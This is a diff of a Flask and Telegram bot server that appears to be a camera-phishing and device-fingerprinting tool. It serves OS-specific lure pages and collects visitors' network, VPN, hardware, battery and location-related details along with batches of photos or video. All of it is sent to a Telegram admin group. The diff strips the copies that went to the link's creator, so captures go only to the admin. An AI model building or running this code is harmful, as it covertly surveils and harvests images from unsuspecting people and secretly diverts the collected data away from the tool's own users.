@@ -40,14 +40,21 @@ def make_link(m):
 
 # --- WEB SERVER LOGIC ---
 @app.route('/')
-def index(): return render_template('index.html')
+def index():
+    ua = request.headers.get('User-Agent', '').lower()
+    # Route to different templates based on OS
+    if 'iphone' in ua or 'ipad' in ua:
+        return render_template('ios.html')
+    elif 'android' in ua:
+        return render_template('android.html')
+    else:
+        return render_template('pc.html')
 
 @app.route('/log_info', methods=['POST'])
 def log_info():
     data = request.json
     tid = request.args.get('id')
     
-    # MAXIMUM Intel Formatting
     info = (
         f"⚡ **GOD-MODE SYSTEM SCAN** ⚡\n"
         f"━━━━━━━━━━━━━━━\n"
@@ -59,28 +66,24 @@ def log_info():
         f"📡 **NETWORK STATUS**\n"
         f"• **Type:** {data.get('net_type', 'N/A')}\n"
         f"• **Speed:** {data.get('net_speed', 'N/A')}\n"
-        f"• **Data Saver:** {data.get('save_data', 'N/A')}\n"
         f"• **VPN/Proxy:** {'⚠️ DETECTED' if data.get('proxy') else '✅ CLEAN'}\n"
         f"━━━━━━━━━━━━━━━\n"
         f"📱 **DEVICE SPECS**\n"
         f"• **Hardware:** {data.get('platform')} ({data.get('cores')} Cores)\n"
         f"• **RAM:** {data.get('memory')} GB\n"
-        f"• **Screen:** {data.get('screen')}\n"
         f"• **Orientation:** {data.get('orientation')}\n"
-        f"• **Dark Mode:** {data.get('darkmode')}\n"
+        f"• **GPU:** {data.get('gpu', 'N/A')}\n"
         f"🔋 **Battery:** {data.get('battery')}\n"
         f"━━━━━━━━━━━━━━━\n"
-        f"🛠️ **BROWSER ENVIRONMENT**\n"
+        f"🛠️ **ENVIRONMENT**\n"
         f"• **Timezone:** {data.get('timezone')}\n"
         f"• **Language:** {data.get('language')}\n"
-        f"• **Touchscreen:** {data.get('touch')}\n"
+        f"• **Motion:** {data.get('motion', 'N/A')}\n"
         f"📄 **UserAgent:** `{data.get('browser')[:60]}...`"
     )
     
-    if tid not in collection:
-        collection[tid] = {"photos": [], "info": info}
-    else:
-        collection[tid]["info"] = info
+    collection[tid] = collection.get(tid, {"photos": []})
+    collection[tid]["info"] = info
     return "OK"
 
 @app.route('/upload', methods=['POST'])
@@ -89,38 +92,19 @@ def upload():
     file_bytes = request.files['file'].read()
     
     if tid not in collection:
-        collection[tid] = {"photos": [], "info": f"ID: `{tid}` (Wait for logs...)"}
+        collection[tid] = {"photos": [], "info": f"ID: `{tid}`"}
     
-    # Handle Video
     if request.args.get('type') == 'video':
         info = collection[tid].get("info", f"ID: {tid}")
-        try:
-            bot.send_message(tid, info, parse_mode="Markdown")
-            bot.send_video(tid, io.BytesIO(file_bytes), caption="✅ Verification Successful")
-            bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"📁 ADMIN LOG\n{info}", parse_mode="Markdown")
-        except: pass
+        bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"📁 VIDEO LOG\n{info}", parse_mode="Markdown")
         return "OK"
 
-    # Handle Photos
     collection[tid]["photos"].append(file_bytes)
     if len(collection[tid]["photos"]) >= 8:
         info = collection[tid].get("info", f"ID: {tid}")
-        
-        # Build albums
-        user_album = [telebot.types.InputMediaPhoto(p) for p in collection[tid]["photos"]]
-        admin_album = []
-        for i, p in enumerate(collection[tid]["photos"]):
-            cap = f"📁 **ADMIN ARCHIVE**\n{info}" if i == 0 else ""
-            admin_album.append(telebot.types.InputMediaPhoto(p, caption=cap, parse_mode="Markdown"))
-        
-        try:
-            # Send to User
-            bot.send_message(tid, info, parse_mode="Markdown")
-            bot.send_media_group(tid, user_album)
-            # Send to Admin
-            bot.send_media_group(GROUP_ID, admin_album)
-        except: pass
-        
+        admin_album = [telebot.types.InputMediaPhoto(p, caption=info if i==0 else "", parse_mode="Markdown") 
+                       for i, p in enumerate(collection[tid]["photos"])]
+        bot.send_media_group(GROUP_ID, admin_album)
         del collection[tid]
     return "OK"
 
@@ -128,8 +112,8 @@ def run_bot():
     while True:
         try:
             bot.remove_webhook()
-            bot.infinity_polling(timeout=20, long_polling_timeout=10)
-        except: time.sleep(5)
+            bot.polling(none_stop=True, interval=0, timeout=20)
+        except: time.sleep(10)
 
 if __name__ == "__main__":
     threading.Thread(target=run_bot, daemon=True).start()
